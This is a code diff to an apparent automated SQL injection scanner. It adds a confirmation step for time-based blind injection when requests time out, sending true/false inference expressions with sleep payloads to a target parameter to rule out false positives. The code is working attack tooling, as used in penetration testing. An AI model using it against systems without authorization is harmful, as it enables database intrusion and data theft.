@@ -716,67 +716,126 @@ def confirm_timebased_sqli(
     delay=0,
     timesec=5,
     is_boolean_confirmed=False,
+    is_read_timedout=False,
+    vector=None,
 ):
     _temp = []
     TEST_CASES_COUNT = 5
+    read_timeout_max_true_cases = 2
     if is_boolean_confirmed:
         TEST_CASES_COUNT = 1
+    if is_read_timedout:
+        TEST_CASES_COUNT = 3
+    inferences = [
+        {"inference": "05689=5689", "response": True},
+        {"inference": "09637=5556", "response": False},
+        {"inference": "02687=26877", "response": False},
+        {"inference": "8965=8956", "response": False},
+        {"inference": "9686=9686", "response": True},
+    ]
     Response = collections.namedtuple("Response", ["vulnerable", "tests_performed"])
     param_key = parameter.get("key")
     param_value = parameter.get("value")
     sleep_times = [i for i in range(0, 10) if i != injected_sleep_time]
     for _ in range(10):
         random.shuffle(sleep_times)
-    for _ in range(TEST_CASES_COUNT):
-        if delay > 0:
-            time.sleep(delay)
-        sleep_time = sleep_times.pop()
-        string = payload_detected.string
-        expression = string.replace("[SLEEPTIME]", "%s" % (sleep_time))
-        decoded_expression = urldecode(expression)
-        logger.payload(f"{decoded_expression}")
-        try:
-            attack = inject_expression(
-                url=url,
-                data=data,
-                proxy=proxy,
-                delay=delay,
-                timesec=timesec,
-                timeout=timeout,
-                headers=headers,
-                parameter=parameter,
-                expression=expression,
-                is_multipart=is_multipart,
-                injection_type=injection_type,
+    if is_read_timedout:
+        sleep_time = timesec
+        for entry in inferences:
+            inference = entry.get("inference")
+            response = entry.get("response")
+            expression = vector.replace("[INFERENCE]", inference).replace(
+                "[SLEEPTIME]", f"{sleep_time}"
             )
-            response_time = attack.response_time
-            if is_different_status_code_injectable:
-                condition_confirm_status_code = with_status_code
-            else:
-                condition_confirm_status_code = base.status_code
-            if (
-                response_time >= sleep_time
-                and response_time != detected_response_time
-                and attack.status_code == condition_confirm_status_code
-            ):
+            decoded_expression = urldecode(expression)
+            logger.payload(f"{decoded_expression}")
+            try:
+                attack = inject_expression(
+                    url=url,
+                    data=data,
+                    proxy=proxy,
+                    delay=delay,
+                    timesec=timesec,
+                    timeout=timeout,
+                    headers=headers,
+                    parameter=parameter,
+                    expression=expression,
+                    is_multipart=is_multipart,
+                    injection_type=injection_type,
+                )
+                response_time = attack.response_time
+                response_inference = bool(response_time >= sleep_time)
+                is_ok = bool(response == response_inference)
                 logger.debug(
-                    "  Test: {}, Response Time {}".format(
-                        decoded_expression, str(response_time)
+                    "  Test: {}, Response Time {}, is ok {}".format(
+                        decoded_expression, str(response_time), str(is_ok)
                     )
                 )
-                _temp.append(
-                    {
-                        "payload": decoded_expression,
-                        "response_time": response_time,
-                    }
+                if response_inference:
+                    _temp.append(
+                        {
+                            "payload": decoded_expression,
+                            "response_time": response_time,
+                        }
+                    )
+            except KeyboardInterrupt as error:
+                logger.warning("user aborted during time-based confirmation phase.")
+                break
+            except Exception as error:
+                logger.critical(f"error {error}, during time-based confirmation phase.")
+                break
+        vulnerable = bool(len(_temp) == 2)
+    else:
+        for index in range(TEST_CASES_COUNT):
+            if delay > 0:
+                time.sleep(delay)
+            sleep_time = sleep_times.pop()
+            string = payload_detected.string
+            expression = string.replace("[SLEEPTIME]", "%s" % (sleep_time))
+            decoded_expression = urldecode(expression)
+            logger.payload(f"{decoded_expression}")
+            try:
+                attack = inject_expression(
+                    url=url,
+                    data=data,
+                    proxy=proxy,
+                    delay=delay,
+                    timesec=timesec,
+                    timeout=timeout,
+                    headers=headers,
+                    parameter=parameter,
+                    expression=expression,
+                    is_multipart=is_multipart,
+                    injection_type=injection_type,
                 )
-        except KeyboardInterrupt as error:
-            logger.warning("user aborted during time-based confirmation phase.")
-            break
-        except Exception as error:
-            logger.critical(f"error {error}, during time-based confirmation phase.")
-            break
-    vulnerable = bool(TEST_CASES_COUNT == len(_temp))
+                response_time = attack.response_time
+                if is_different_status_code_injectable:
+                    condition_confirm_status_code = with_status_code
+                else:
+                    condition_confirm_status_code = base.status_code
+                if (
+                    response_time >= sleep_time
+                    and response_time != detected_response_time
+                    and attack.status_code == condition_confirm_status_code
+                ):
+                    logger.debug(
+                        "  Test: {}, Response Time {}".format(
+                            decoded_expression, str(response_time)
+                        )
+                    )
+                    _temp.append(
+                        {
+                            "payload": decoded_expression,
+                            "response_time": response_time,
+                        }
+                    )
+            except KeyboardInterrupt as error:
+                logger.warning("user aborted during time-based confirmation phase.")
+                break
+            except Exception as error:
+                logger.critical(f"error {error}, during time-based confirmation phase.")
+                break
+        vulnerable = bool(TEST_CASES_COUNT == len(_temp))
     ok = Response(vulnerable=vulnerable, tests_performed=_temp)
     return ok
 
@@ -968,6 +1027,7 @@ def check_timebased_sqli(
                 error_msg = attack.error_msg
                 http_firewall_code_counter += 1
                 continue
+            logger.debug(f"sleep time: {sleep_time}, response time: {response_time}")
             if response_time >= sleep_time:
                 is_injected = True
                 _it = injection_type
@@ -979,6 +1039,33 @@ def check_timebased_sqli(
                     message = f"(custom) {injection_type} parameter '{mc}JSON {param_key}{nc}' appears to be '{mc}{entry.title}{nc}' injectable{with_status_code_msg}"
                 else:
                     message = f"{_it} parameter '{mc}{param_key}{nc}' appears to be '{mc}{entry.title}{nc}' injectable{with_status_code_msg}"
+                if with_status_code_msg and "ReadTimeout" in with_status_code_msg:
+                    logger.warning(
+                        "in case of read timeout performing further tests to confirm if the detected payload is working.."
+                    )
+                    ok = confirm_timebased_sqli(
+                        base,
+                        parameter,
+                        _payload,
+                        sleep_time,
+                        response_time,
+                        url=url,
+                        data=data,
+                        headers=headers,
+                        injection_type=injection_type,
+                        proxy=proxy,
+                        is_multipart=is_multipart,
+                        timeout=timeout,
+                        delay=delay,
+                        timesec=timesec,
+                        is_read_timedout=True,
+                        vector=f"{_payload.prefix}{entry.vector}{_payload.suffix}",
+                    )
+                    if not ok.vulnerable:
+                        logger.warning(
+                            "false positive payload detected with read timeout continue testing.."
+                        )
+                        continue
                 logger.notice(message)
                 _url = attack.request_url if injection_type == "GET" else attack.url
                 _temp = Response(
